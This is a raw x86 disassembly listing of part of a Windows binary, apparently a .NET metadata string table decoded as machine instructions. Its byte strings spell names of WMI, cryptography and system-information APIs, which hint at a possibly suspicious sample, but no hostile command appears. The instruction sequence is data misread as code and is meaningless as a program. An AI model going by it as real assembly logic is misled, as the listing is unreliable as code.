  404234:	push   es
  404235:	add    BYTE PTR [ebp+esi*1+0x11],ch
  404239:	xor    BYTE PTR [edx],bh
  40423b:	xor    BYTE PTR [eax+0x30],ch
  40423e:	xor    BYTE PTR [eax],0xa7
  404241:	xor    cl,ch
  404243:	xor    al,bh
  404245:	xor    BYTE PTR [eax],cl
  404247:	add    BYTE PTR [ecx],al
  404249:	add    BYTE PTR [edx],cl
  40424b:	add    BYTE PTR [edx],al
  40424d:	add    BYTE PTR [eax],al
  40424f:	add    BYTE PTR [edx+eax*1+0x7a],bh
  404253:	sub    al,0x0
  404255:	add    BYTE PTR [eax],dh
  404257:	or     ah,dl
  404259:	add    BYTE PTR cs:[eax],al
  40425c:	cmp    BYTE PTR [edx],cl
  40425e:	out    0x2e,eax
  404260:	add    al,BYTE PTR [eax]
  404262:	push   cs
  404263:	add    BYTE PTR [ebx],al
  404265:	add    BYTE PTR [edx],al
  404267:	add    BYTE PTR [ebx],dl
  404269:	add    BYTE PTR ds:0x14000200,al
  40426f:	add    BYTE PTR [edi],al
  404271:	add    BYTE PTR [ecx+edx*1],al
  404274:	add    BYTE PTR [ecx],al
  404276:	pop    ss
  404277:	add    BYTE PTR [edi],cl
  404279:	adc    DWORD PTR [ecx],eax
  40427b:	add    BYTE PTR [eax+eax*4],al
  40427e:	add    BYTE PTR [eax],al
  404280:	add    al,0x0
  404282:	add    BYTE PTR [eax],al
  404284:	add    BYTE PTR [eax],al
  404286:	add    BYTE PTR [eax],al
  404288:	add    DWORD PTR [eax],eax
  40428a:	add    BYTE PTR [eax],al
  40428c:	or     eax,0x972f
  404291:	add    BYTE PTR [eax+eax*1],al
	...
  40429c:	add    BYTE PTR [eax],al
  40429e:	add    DWORD PTR [eax],eax
  4042a0:	mov    ebx,0x0
  4042a5:	add    BYTE PTR [eax+eax*1],al
	...
  4042b0:	add    BYTE PTR [eax],al
  4042b2:	add    DWORD PTR [eax],eax
  4042b4:	les    eax,FWORD PTR [eax]
  4042b6:	add    BYTE PTR [eax],al
  4042b8:	add    BYTE PTR [eax],al
  4042ba:	add    al,0x0
	...
  4042c4:	add    BYTE PTR [eax],al
  4042c6:	daa    
  4042c7:	add    BYTE PTR [edx+0x1],dh
  4042cd:	add    BYTE PTR [eax],al
  4042cf:	add    BYTE PTR [eax],al
  4042d1:	add    BYTE PTR [ecx],al
  4042d3:	add    BYTE PTR [eax],al
  4042d5:	add    cl,bl
  4042d7:	adc    DWORD PTR [eax],eax
  4042d9:	add    BYTE PTR [ebx],al
  4042db:	add    BYTE PTR [edx],al
  4042dd:	add    BYTE PTR [eax+eax*1],al
  4042e0:	add    al,BYTE PTR [eax]
  4042e2:	mov    cl,0x0
  4042e4:	in     al,0x30
  4042e6:	add    BYTE PTR [eax],al
  4042e8:	add    BYTE PTR [ecx*2+0x6c75646f],bh
  4042ef:	gs add BYTE PTR ds:[ebp+0x67],cl
  4042f4:	ins    DWORD PTR es:[edi],dx
  4042f5:	je     0x40433a
  4042f7:	ins    BYTE PTR es:[edi],dx
  4042f8:	popa   
  4042f9:	jae    0x40436e
  4042fb:	inc    edi
  4042fc:	outs   dx,BYTE PTR gs:[esi]
  4042fe:	cs gs js 0x404367
  404302:	add    BYTE PTR [edi+0x65],al
  404305:	outs   dx,BYTE PTR ds:[esi]
  404306:	push   edi
  404307:	ins    DWORD PTR es:[edi],dx
  404308:	imul   eax,DWORD PTR [ebx+0x6c],0x737361
  40430f:	dec    ebp
  404310:	popa   
  404311:	outs   dx,BYTE PTR ds:[esi]
  404312:	popa   
  404313:	gs ins DWORD PTR es:[di],dx
  404316:	outs   dx,BYTE PTR gs:[esi]
  404318:	je     0x40435d
  40431a:	ins    BYTE PTR es:[edi],dx
  40431b:	popa   
  40431c:	jae    0x404391
  40431e:	inc    edi
  40431f:	outs   dx,BYTE PTR gs:[esi]
  404321:	gs jb  0x404385
  404324:	je     0x404395
  404326:	jb     0x404328
  404328:	inc    ebp
  404329:	outs   dx,BYTE PTR ds:[esi]
  40432a:	arpl   WORD PTR [edx+0x79],si
  40432d:	jo     0x4043a3
  40432f:	gs fs inc esp
  404332:	popa   
  404333:	je     0x404396
  404335:	add    BYTE PTR [esi+0x61],cl
  404338:	je     0x4043a3
  40433a:	jbe    0x4043a1
  40433c:	dec    ebp
  40433d:	gs je  0x4043a8
  404340:	outs   dx,DWORD PTR ds:[esi]
  404341:	fs jae 0x404344
  404344:	inc    esi
  404345:	pop    eax
  404346:	inc    ecx
  404347:	jae    0x4043bc
  404349:	gs ins DWORD PTR es:[edi],dx
  40434b:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  40434f:	push   esp
  404350:	push   0x73417369
  404355:	jae    0x4043bc
  404357:	ins    DWORD PTR es:[edi],dx
  404358:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  40435c:	inc    ecx
  40435d:	jae    0x4043d2
  40435f:	gs ins DWORD PTR es:[edi],dx
  404361:	bound  ebp,QWORD PTR [ecx+edi*2+0x52]
  404365:	data16 add BYTE PTR gs:[ebx+0x52],dl
  40436a:	inc    esp
  40436b:	gs jae 0x4043d1
  40436e:	jb     0x4043d9
  404370:	jo     0x4043e6
  404372:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  404379:	imul   esp,DWORD PTR [edx+0x75],0x4d006574
  404380:	ins    DWORD PTR es:[di],dx
  404382:	je     0x4043c7
  404384:	ins    BYTE PTR es:[edi],dx
  404385:	popa   
  404386:	jae    0x4043fb
  404388:	inc    edi
  404389:	outs   dx,BYTE PTR gs:[esi]
  40438b:	add    BYTE PTR [ebx+0x52],dl
  40438e:	inc    ebx
  40438f:	popa   
  404390:	je     0x4043f7
  404392:	outs   dx,DWORD PTR ds:[si]
  404394:	jb     0x40440f
  404396:	inc    ecx
  404397:	je     0x40440d
  404399:	jb     0x404404
  40439b:	bound  esi,QWORD PTR [ebp+0x74]
  40439e:	add    BYTE PTR gs:[ebx+0x52],dl
  4043a2:	add    BYTE PTR [ebp+0x73],ch
  4043a5:	arpl   WORD PTR [edi+0x72],bp
  4043a8:	ins    BYTE PTR es:[edi],dx
  4043a9:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  4043b0:	gs ins DWORD PTR es:[edi],dx
  4043b2:	add    BYTE PTR [edi+0x62],cl
  4043b5:	push   0x65
  4043b7:	arpl   WORD PTR [eax+eax*1+0x53],si
  4043bb:	jns    0x404430
  4043bd:	je     0x404424
  4043bf:	ins    DWORD PTR es:[edi],dx
  4043c0:	cs inc ebx
  4043c2:	outs   dx,DWORD PTR ds:[esi]
  4043c3:	ins    DWORD PTR es:[edi],dx
  4043c4:	jo     0x404435
  4043c6:	outs   dx,BYTE PTR ds:[esi]
  4043c7:	outs   dx,BYTE PTR gs:[esi]
  4043c9:	je     0x404418
  4043cb:	outs   dx,DWORD PTR ds:[esi]
  4043cc:	fs gs ins BYTE PTR es:[edi],dx
  4043cf:	add    BYTE PTR [ebp+eiz*2+0x73],al
  4043d3:	arpl   WORD PTR [edx+0x69],si
  4043d6:	jo     0x40444c
  4043d8:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4043df:	imul   esp,DWORD PTR [edx+0x75],0x43006574
  4043e6:	popa   
  4043e7:	je     0x40444e
  4043e9:	outs   dx,DWORD PTR ds:[si]
  4043eb:	jb     0x404466
  4043ed:	inc    ecx
  4043ee:	je     0x404464
  4043f0:	jb     0x40445b
  4043f2:	bound  esi,QWORD PTR [ebp+0x74]
  4043f5:	add    BYTE PTR gs:[esi],ch
  4043f8:	arpl   WORD PTR [edi+ebp*2+0x72],si
  4043fc:	add    BYTE PTR [ebx+0x65],dl
  4043ff:	jb     0x404477
  404401:	gs jb  0x404404
  404404:	push   edi
  404405:	dec    ebp
  404406:	dec    ecx
  404407:	dec    esi
  404408:	popa   
  404409:	ins    DWORD PTR es:[edi],dx
  40440a:	gs jae 0x40447d
  40440d:	popa   
  40440e:	arpl   WORD PTR [ebp+0x0],sp
  404411:	inc    ebx
  404412:	ins    BYTE PTR es:[edi],dx
  404413:	popa   
  404414:	jae    0x404489
  404416:	dec    esi
  404417:	popa   
  404418:	ins    DWORD PTR es:[edi],dx
  404419:	add    BYTE PTR gs:[ebp+0x73],dl
  40441d:	gs jb  0x40448e
  404420:	popa   
  404421:	ins    DWORD PTR es:[edi],dx
  404422:	add    BYTE PTR gs:[eax+0x61],dh
  404426:	jae    0x40449b
  404428:	ja     0x404499
  40442a:	jb     0x404490
  40442c:	add    BYTE PTR [ecx+0x75],al
  40442f:	je     0x404499
  404431:	outs   dx,DWORD PTR ds:[esi]
  404432:	jb     0x40449d
  404434:	je     0x4044af
  404436:	add    BYTE PTR [ebx+0x79],dl
  404439:	jae    0x4044af
  40443b:	gs ins DWORD PTR es:[edi],dx
  40443d:	cs push edx
  40443f:	gs jae 0x4044b1
  404442:	jne    0x4044b6
  404444:	arpl   WORD PTR [ebp+0x73],sp
  404447:	add    BYTE PTR [edx+0x65],dl
  40444a:	jae    0x4044bb
  40444c:	jne    0x4044c0
  40444e:	arpl   WORD PTR [ebp+0x4d],sp
  404451:	popa   
  404452:	outs   dx,BYTE PTR ds:[esi]
  404453:	popa   
  404454:	addr16 gs jb 0x404458
  404458:	jb     0x4044bf
  40445a:	jae    0x4044a9
  40445c:	addr16 jb 0x40445f
  40445f:	push   ebx
  404460:	jns    0x4044d5
  404462:	je     0x4044c9
  404464:	ins    DWORD PTR es:[edi],dx
  404465:	cs inc edi
  404467:	ins    BYTE PTR es:[edi],dx
  404468:	outs   dx,DWORD PTR ds:[esi]
  404469:	bound  esp,QWORD PTR [ecx+0x6c]
  40446c:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  404473:	add    BYTE PTR [ebx+0x75],al
  404476:	ins    BYTE PTR es:[edi],dx
  404477:	je     0x4044ee
  404479:	jb     0x4044e0
  40447b:	dec    ecx
  40447c:	outs   dx,BYTE PTR ds:[esi]
  40447d:	outs   dx,WORD PTR ds:[esi]
  40447f:	add    BYTE PTR [ebx+0x75],ah
  404482:	jb     0x4044c7
  404484:	jne    0x4044f2
  404486:	je     0x4044fd
  404488:	jb     0x4044ef
  40448a:	add    BYTE PTR [ebp+0x61],cl
  40448d:	imul   ebp,DWORD PTR [esi+0x0],0x776f6853
  404494:	push   ebp
  404495:	jae    0x4044f8
  404497:	add    BYTE PTR gs:[bp+di+0x79],dl
  40449c:	jae    0x404512
  40449e:	gs ins DWORD PTR es:[edi],dx
  4044a0:	cs dec ebp
  4044a2:	popa   
  4044a3:	outs   dx,BYTE PTR ds:[esi]
  4044a4:	popa   
  4044a5:	gs ins DWORD PTR es:[di],dx
  4044a8:	outs   dx,BYTE PTR gs:[esi]
  4044aa:	je     0x4044ac
  4044ac:	inc    ebx
  4044ad:	outs   dx,DWORD PTR ds:[esi]
  4044ae:	fs gs dec esp
  4044b1:	popa   
  4044b2:	outs   dx,BYTE PTR ds:[esi]
  4044b3:	addr16 jne 0x404517
  4044b6:	add    BYTE PTR gs:[bx+di+0x6e],cl
  4044bb:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  4044c3:	inc    ebx
  4044c4:	outs   dx,DWORD PTR ds:[esi]
  4044c5:	fs gs inc edi
  4044c8:	outs   dx,BYTE PTR gs:[esi]
  4044ca:	gs jb  0x40452e
  4044cd:	je     0x40453e
  4044cf:	jb     0x4044d1
  4044d1:	dec    ebp
  4044d2:	popa   
  4044d3:	outs   dx,BYTE PTR ds:[esi]
  4044d4:	popa   
  4044d5:	gs ins DWORD PTR es:[di],dx
  4044d8:	outs   dx,BYTE PTR gs:[esi]
  4044da:	je     0x40451f
  4044dc:	ins    BYTE PTR es:[edi],dx
  4044dd:	popa   
  4044de:	jae    0x404553
  4044e0:	add    BYTE PTR [ecx+0x6e],cl
  4044e3:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  4044eb:	inc    ebx
  4044ec:	ins    BYTE PTR es:[edi],dx
  4044ed:	popa   
  4044ee:	jae    0x404563
  4044f0:	dec    edi
  4044f1:	bound  ebp,QWORD PTR [edx+0x65]
  4044f4:	arpl   WORD PTR [eax+eax*1+0x47],si
  4044f8:	gs je  0x40454b
  4044fb:	popa   
  4044fc:	jae    0x404571
  4044fe:	ja     0x40456f
  404500:	jb     0x404566
  404502:	add    BYTE PTR [ebp+0x6e],ah
  404505:	arpl   WORD PTR [edx+0x79],si
  404508:	jo     0x40457e
  40450a:	gs fs inc esp
  40450d:	popa   
  40450e:	je     0x404571
  404510:	add    BYTE PTR [ebx+0x79],dl
  404513:	jae    0x404589
  404515:	gs ins DWORD PTR es:[edi],dx
  404517:	cs push ebx
  404519:	arpl   WORD PTR gs:[ebp+0x72],si
  40451d:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x70797243
  404525:	je     0x404596
  404527:	addr16 jb 0x40458b
  40452a:	jo     0x404594
  40452c:	jns    0x40452e
  40452e:	push   edx
  40452f:	imul   ebp,DWORD PTR [edx+0x6e],0x6c656164
  404536:	add    BYTE PTR [edx+0x69],dh
  404539:	push   0x6e
  40453b:	fs popa 
  40453d:	gs ins BYTE PTR es:[edi],dx
  40453f:	add    BYTE PTR [ebx+0x65],dl
  404542:	je     0x404588
  404544:	popa   
  404545:	je     0x4045a8
  404547:	add    BYTE PTR [edi+0x65],al
  40454a:	je     0x404590
  40454c:	popa   
  40454d:	je     0x4045b0
  40454f:	add    BYTE PTR [edi+0x65],al
  404552:	je     0x404597
  404554:	push   0x72655600
  404559:	jae    0x4045c4
  40455b:	outs   dx,DWORD PTR ds:[esi]
  40455c:	outs   dx,BYTE PTR ds:[esi]
  40455d:	add    BYTE PTR [ecx+ebp*2+0x74],dl
  404561:	ins    BYTE PTR es:[edi],dx
  404562:	add    BYTE PTR gs:[ebp+eiz*2+0x73],al
  404567:	arpl   WORD PTR [edx+0x69],si
  40456a:	jo     0x4045e0
  40456c:	imul   ebp,DWORD PTR [edi+0x6e],0x66654400
  404573:	popa   
  404574:	jne    0x4045e2
  404576:	je     0x4045b9
  404578:	ins    BYTE PTR es:[edi],dx
  404579:	imul   esp,DWORD PTR [ecx+0x73],0x706f4300
  404580:	jns    0x4045f4
  404582:	imul   esp,DWORD PTR [edi+0x68],0x6e490074
  404589:	outs   dx,WORD PTR ds:[esi]
  40458b:	jb     0x4045fa
  40458d:	popa   
  40458e:	je     0x4045f9
  404590:	outs   dx,DWORD PTR ds:[esi]
  404591:	outs   dx,BYTE PTR ds:[esi]
  404592:	popa   
  404593:	ins    BYTE PTR es:[edi],dx
  404594:	push   esi
  404595:	gs jb  0x40460b
  404598:	imul   ebp,DWORD PTR [edi+0x6e],0x69614400
  40459f:	ins    BYTE PTR es:[edi],dx
  4045a0:	jns    0x4045e4
  4045a2:	jne    0x40460d
  4045a4:	ins    BYTE PTR es:[edi],dx
  4045a5:	fs dec esi
  4045a7:	jne    0x404616
  4045a9:	bound  esp,QWORD PTR [ebp+0x72]
  4045ac:	push   ebx
  4045ad:	je     0x404621
  4045af:	add    BYTE PTR [edx+0x75],al
  4045b2:	imul   ebp,DWORD PTR [esp+eiz*2+0x52],0x73697665
  4045ba:	imul   ebp,DWORD PTR [edi+0x6e],0x727453
  4045c1:	inc    esp
  4045c2:	popa   
  4045c3:	imul   ebp,DWORD PTR [ecx+edi*2+0x42],0x646c6975
  4045cb:	dec    esi
  4045cc:	jne    0x40463b
  4045ce:	bound  esp,QWORD PTR [ebp+0x72]
  4045d1:	add    BYTE PTR [ebp+0x63],al
  4045d4:	ins    DWORD PTR es:[edi],dx
  4045d5:	popa   
  4045d6:	push   eax
  4045d7:	jne    0x40463b
  4045d9:	ins    BYTE PTR es:[edi],dx
  4045da:	imul   esp,DWORD PTR [ebx+0x4b],0x45007965
  4045e1:	arpl   WORD PTR [ebp+0x61],bp
  4045e4:	push   eax
  4045e5:	jne    0x404649
  4045e7:	ins    BYTE PTR es:[edi],dx
  4045e8:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  4045ef:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  4045f3:	inc    ebp
  4045f4:	arpl   WORD PTR [ebp+0x61],bp
  4045f7:	push   eax
  4045f8:	jne    0x40465c
  4045fa:	ins    BYTE PTR es:[edi],dx
  4045fb:	imul   esp,DWORD PTR [ebx+0x4b],0x75467965
  404602:	ins    BYTE PTR es:[edi],dx
  404603:	ins    BYTE PTR es:[edi],dx
  404604:	add    BYTE PTR [ebx+0x69],dl
  404607:	ins    BYTE PTR es:[edi],dx
  404608:	jbe    0x40466f
  40460a:	jb     0x404678
  40460c:	imul   esp,DWORD PTR [edi+0x68],0x62755074
  404613:	ins    BYTE PTR es:[edi],dx
  404614:	imul   esp,DWORD PTR [ebx+0x4b],0x53007965
  40461b:	imul   ebp,DWORD PTR [esi+esi*2+0x65],0x67696c72
  404623:	push   0x62755074
  404628:	ins    BYTE PTR es:[edi],dx
  404629:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  404630:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  404634:	push   ebx
  404635:	imul   ebp,DWORD PTR [esi+esi*2+0x65],0x67696c72
  40463d:	push   0x62755074
  404642:	ins    BYTE PTR es:[edi],dx
  404643:	imul   esp,DWORD PTR [ebx+0x4b],0x75467965
  40464a:	ins    BYTE PTR es:[edi],dx
  40464b:	ins    BYTE PTR es:[edi],dx
  40464c:	add    BYTE PTR [ebx+0x69],dl
  40464f:	ins    BYTE PTR es:[edi],dx
  404650:	jbe    0x4046b7
  404652:	jb     0x4046c0
  404654:	imul   esp,DWORD PTR [edi+0x68],0x616c5074
  40465b:	je     0x4046c3
  40465d:	outs   dx,DWORD PTR ds:[esi]
  40465e:	jb     0x4046cd
  404660:	push   eax
  404661:	jne    0x4046c5
  404663:	ins    BYTE PTR es:[edi],dx
  404664:	imul   esp,DWORD PTR [ebx+0x4b],0x53007965
  40466b:	imul   ebp,DWORD PTR [esi+esi*2+0x65],0x67696c72
  404673:	push   0x616c5074
  404678:	je     0x4046e0
  40467a:	outs   dx,DWORD PTR ds:[esi]
  40467b:	jb     0x4046ea
  40467d:	push   eax
  40467e:	jne    0x4046e2
  404680:	ins    BYTE PTR es:[edi],dx
  404681:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  404688:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  40468c:	push   ebx
  40468d:	imul   ebp,DWORD PTR [esi+esi*2+0x65],0x67696c72
  404695:	push   0x616c5074
  40469a:	je     0x404702
  40469c:	outs   dx,DWORD PTR ds:[esi]
  40469d:	jb     0x40470c
  40469f:	push   eax
  4046a0:	jne    0x404704
  4046a2:	ins    BYTE PTR es:[edi],dx
  4046a3:	imul   esp,DWORD PTR [ebx+0x4b],0x75467965
  4046aa:	ins    BYTE PTR es:[edi],dx
  4046ab:	ins    BYTE PTR es:[edi],dx
  4046ac:	add    BYTE PTR [eax+0x6c],dl
  4046af:	popa   
  4046b0:	je     0x404718
  4046b2:	outs   dx,DWORD PTR ds:[esi]
  4046b3:	jb     0x404722
  4046b5:	push   eax
  4046b6:	jne    0x40471a
  4046b8:	ins    BYTE PTR es:[edi],dx
  4046b9:	imul   esp,DWORD PTR [ebx+0x4b],0x50007965
  4046c0:	ins    BYTE PTR es:[edi],dx
  4046c1:	popa   
  4046c2:	je     0x40472a
  4046c4:	outs   dx,DWORD PTR ds:[esi]
  4046c5:	jb     0x404734
  4046c7:	push   eax
  4046c8:	jne    0x40472c
  4046ca:	ins    BYTE PTR es:[edi],dx
  4046cb:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  4046d2:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  4046d6:	push   eax
  4046d7:	ins    BYTE PTR es:[edi],dx
  4046d8:	popa   
  4046d9:	je     0x404741
  4046db:	outs   dx,DWORD PTR ds:[esi]
  4046dc:	jb     0x40474b
  4046de:	push   eax
  4046df:	jne    0x404743
  4046e1:	ins    BYTE PTR es:[edi],dx
  4046e2:	imul   esp,DWORD PTR [ebx+0x4b],0x75467965
  4046e9:	ins    BYTE PTR es:[edi],dx
  4046ea:	ins    BYTE PTR es:[edi],dx
  4046eb:	add    BYTE PTR [ebp+0x73],cl
  4046ee:	arpl   WORD PTR [edi+0x72],bp
  4046f1:	ins    BYTE PTR es:[edi],dx
  4046f2:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  4046f9:	gs ins DWORD PTR es:[edi],dx
  4046fb:	inc    esp
  4046fc:	popa   
  4046fd:	je     0x404760
  4046ff:	add    BYTE PTR [ebx+0x79],dl
  404702:	jae    0x404778
  404704:	gs ins DWORD PTR es:[edi],dx
  404706:	inc    esp
  404707:	popa   
  404708:	je     0x40476b
  40470a:	dec    edi
  40470b:	jb     0x40476e
  40470d:	arpl   WORD PTR [ebp+eiz*2+0x43],bp
  404711:	ins    BYTE PTR es:[edi],dx
  404712:	imul   esp,DWORD PTR [ebp+0x6e],0x79530074
  404719:	jae    0x40478f
  40471b:	gs ins DWORD PTR es:[edi],dx
  40471d:	inc    ebx
  40471e:	outs   dx,DWORD PTR ds:[esi]
  40471f:	jb     0x404786
  404721:	add    BYTE PTR [ebx+0x79],dl
  404724:	jae    0x40479a
  404726:	gs ins DWORD PTR es:[edi],dx
  404728:	dec    esi
  404729:	jne    0x404798
  40472b:	gs jb  0x404797
  40472e:	arpl   WORD PTR [ebx+0x0],si
  404731:	push   ebx
  404732:	jns    0x4047a7
  404734:	je     0x40479b
  404736:	ins    DWORD PTR es:[edi],dx
  404737:	push   edx
  404738:	jne    0x4047a8
  40473a:	je     0x4047a5
  40473c:	ins    DWORD PTR es:[edi],dx
  40473d:	gs push edx
  40473f:	gs ins DWORD PTR es:[edi],dx
  404741:	outs   dx,DWORD PTR ds:[esi]
  404742:	je     0x4047ad
  404744:	outs   dx,BYTE PTR ds:[esi]
  404745:	add    BYTE PTR [bp+di+0x79],dl
  404749:	jae    0x4047bf
  40474b:	gs ins DWORD PTR es:[edi],dx
  40474d:	push   esp
  40474e:	push   0x64616572
  404753:	imul   ebp,DWORD PTR [esi+0x67],0x6b736154
  40475a:	jae    0x4047a0
  40475c:	popa   
  40475d:	je     0x4047c0
  40475f:	data16 ins BYTE PTR es:[edi],dx
  404761:	outs   dx,DWORD PTR ds:[esi]
  404762:	ja     0x404764
  404764:	push   ebx
  404765:	jns    0x4047da
  404767:	je     0x4047ce
  404769:	ins    DWORD PTR es:[edi],dx
  40476a:	push   edi
  40476b:	imul   ebp,DWORD PTR [esi+0x64],0x4673776f
  404772:	outs   dx,DWORD PTR ds:[esi]
  404773:	jb     0x4047e2
  404775:	jae    0x404777
  404777:	push   ebx
  404778:	jns    0x4047ed
  40477a:	je     0x4047e1
  40477c:	ins    DWORD PTR es:[edi],dx
  40477d:	pop    eax
  40477e:	ins    DWORD PTR es:[edi],dx
  40477f:	ins    BYTE PTR es:[edi],dx
  404780:	add    BYTE PTR [ebp+0x69],cl
  404783:	arpl   WORD PTR [edx+0x6f],si
  404786:	jae    0x4047f7
  404788:	data16 je 0x4047db
  40478b:	jne    0x4047ef
  40478d:	ins    BYTE PTR es:[edi],dx
  40478e:	imul   esp,DWORD PTR [ebx+0x4b],0x4d007965
  404795:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40479c:	je     0x4047ee
  40479e:	jne    0x404802
  4047a0:	ins    BYTE PTR es:[edi],dx
  4047a1:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  4047a8:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  4047ac:	dec    ebp
  4047ad:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4047b4:	je     0x404806
  4047b6:	jne    0x40481a
  4047b8:	ins    BYTE PTR es:[edi],dx
  4047b9:	imul   esp,DWORD PTR [ebx+0x4b],0x75467965
  4047c0:	ins    BYTE PTR es:[edi],dx
  4047c1:	ins    BYTE PTR es:[edi],dx
  4047c2:	add    BYTE PTR [ebx+0x68],dl
  4047c5:	popa   
  4047c6:	jb     0x40482d
  4047c8:	fs dec esp
  4047ca:	imul   esp,DWORD PTR [edx+0x50],0x696c6275
  4047d1:	arpl   WORD PTR [ebx+0x65],cx
  4047d4:	jns    0x4047d6
  4047d6:	push   ebx
  4047d7:	push   0x64657261
  4047dc:	dec    esp
  4047dd:	imul   esp,DWORD PTR [edx+0x50],0x696c6275
  4047e4:	arpl   WORD PTR [ebx+0x65],cx
  4047e7:	jns    0x40483d
  4047e9:	outs   dx,DWORD PTR ds:[esi]
  4047ea:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  4047ee:	push   ebx
  4047ef:	push   0x64657261
  4047f4:	dec    esp
  4047f5:	imul   esp,DWORD PTR [edx+0x50],0x696c6275
  4047fc:	arpl   WORD PTR [ebx+0x65],cx
  4047ff:	jns    0x404847
  404801:	jne    0x40486f
  404803:	ins    BYTE PTR es:[edi],dx
  404804:	add    BYTE PTR [ebx+0x79],dl
  404807:	jae    0x40487d
  404809:	gs ins DWORD PTR es:[edi],dx
  40480b:	inc    ebx
  40480c:	outs   dx,DWORD PTR ds:[esi]
  40480d:	ins    DWORD PTR es:[edi],dx
  40480e:	jo     0x40487f
  404810:	outs   dx,BYTE PTR ds:[esi]
  404811:	outs   dx,BYTE PTR gs:[esi]
  404813:	je     0x404862
  404815:	outs   dx,DWORD PTR ds:[esi]
  404816:	fs gs ins BYTE PTR es:[edi],dx
  404819:	inc    esp
  40481a:	popa   
  40481b:	je     0x40487e
  40481d:	inc    ecx
  40481e:	outs   dx,BYTE PTR ds:[esi]
  40481f:	outs   dx,BYTE PTR ds:[esi]
  404820:	outs   dx,DWORD PTR ds:[esi]
  404821:	je     0x404884
  404823:	je     0x40488e
  404825:	outs   dx,DWORD PTR ds:[esi]
  404826:	outs   dx,BYTE PTR ds:[esi]
  404827:	jae    0x404829
  404829:	push   ebx
  40482a:	jns    0x40489f
  40482c:	je     0x404893
  40482e:	ins    DWORD PTR es:[edi],dx
  40482f:	inc    ebx
  404830:	outs   dx,DWORD PTR ds:[esi]
  404831:	outs   dx,BYTE PTR ds:[esi]
  404832:	imul   sp,WORD PTR [edi+0x75],0x6172
  404838:	je     0x4048a3
  40483a:	outs   dx,DWORD PTR ds:[esi]
  40483b:	outs   dx,BYTE PTR ds:[esi]
  40483c:	add    BYTE PTR [ebx+0x79],dl
  40483f:	jae    0x4048b5
  404841:	gs ins DWORD PTR es:[edi],dx
  404843:	inc    ebx
  404844:	outs   dx,DWORD PTR ds:[esi]
  404845:	outs   dx,BYTE PTR ds:[esi]
  404846:	imul   sp,WORD PTR [edi+0x75],0x6172
  40484c:	je     0x4048b7
  40484e:	outs   dx,DWORD PTR ds:[esi]
  40484f:	outs   dx,BYTE PTR ds:[esi]
  404850:	dec    ecx
  404851:	outs   dx,BYTE PTR ds:[esi]
  404852:	jae    0x4048c8
  404854:	popa   
  404855:	ins    BYTE PTR es:[edi],dx
  404856:	ins    BYTE PTR es:[edi],dx
  404857:	add    BYTE PTR [ebx+0x79],dl
  40485a:	jae    0x4048d0
  40485c:	gs ins DWORD PTR es:[edi],dx
  40485e:	inc    esp
  40485f:	gs jo  0x4048ce
  404862:	outs   dx,DWORD PTR ds:[esi]
  404863:	jns    0x4048d2
  404865:	outs   dx,BYTE PTR gs:[esi]
  404867:	je     0x404869
  404869:	push   ebx
  40486a:	jns    0x4048df
  40486c:	je     0x4048d3
  40486e:	ins    DWORD PTR es:[edi],dx
  40486f:	inc    esp
  404870:	gs jae 0x4048dc
  404873:	outs   dx,BYTE PTR ds:[si]
  404875:	add    BYTE PTR [ebx+0x79],dl
  404878:	jae    0x4048ee
  40487a:	gs ins DWORD PTR es:[edi],dx
  40487c:	inc    esp
  40487d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  404884:	jns    0x4048d9
  404886:	gs jb  0x4048ff
  404889:	imul   esp,DWORD PTR [ebx+0x65],0x79530073
  404890:	jae    0x404906
  404892:	gs ins DWORD PTR es:[edi],dx
  404894:	inc    esp
  404895:	jb     0x4048f8
  404897:	ja     0x404902
  404899:	outs   dx,BYTE PTR ds:[esi]
  40489a:	addr16 inc esp
  40489c:	gs jae 0x404908
  40489f:	outs   dx,BYTE PTR ds:[si]
  4048a1:	add    BYTE PTR [ebx+0x79],dl
  4048a4:	jae    0x40491a
  4048a6:	gs ins DWORD PTR es:[edi],dx
  4048a8:	inc    esp
  4048a9:	jb     0x40490c
  4048ab:	ja     0x404916
  4048ad:	outs   dx,BYTE PTR ds:[esi]
  4048ae:	add    BYTE PTR [bp+di+0x79],dl
  4048b2:	jae    0x404928
  4048b4:	gs ins DWORD PTR es:[edi],dx
  4048b6:	inc    ebp
  4048b7:	outs   dx,BYTE PTR ds:[esi]
  4048b8:	je     0x40491f
  4048ba:	jb     0x40492c
  4048bc:	jb     0x404927
  4048be:	jae    0x404925
  4048c0:	push   ebx
  4048c1:	gs jb  0x40493a
  4048c4:	imul   esp,DWORD PTR [ebx+0x65],0x79530073
  4048cb:	jae    0x404941
  4048cd:	gs ins DWORD PTR es:[edi],dx
  4048cf:	dec    ebp
  4048d0:	popa   
  4048d1:	outs   dx,BYTE PTR ds:[esi]
  4048d2:	popa   
  4048d3:	gs ins DWORD PTR es:[di],dx
  4048d6:	outs   dx,BYTE PTR gs:[esi]
  4048d8:	je     0x4048da
  4048da:	push   ebx
  4048db:	jns    0x404950
  4048dd:	je     0x404944
  4048df:	ins    DWORD PTR es:[edi],dx
  4048e0:	dec    ebp
  4048e1:	gs jae 0x404957
  4048e4:	popa   
  4048e5:	imul   ebp,DWORD PTR [bp+0x67],0x73795300
  4048ed:	je     0x404954
  4048ef:	ins    DWORD PTR es:[edi],dx
  4048f0:	dec    esi
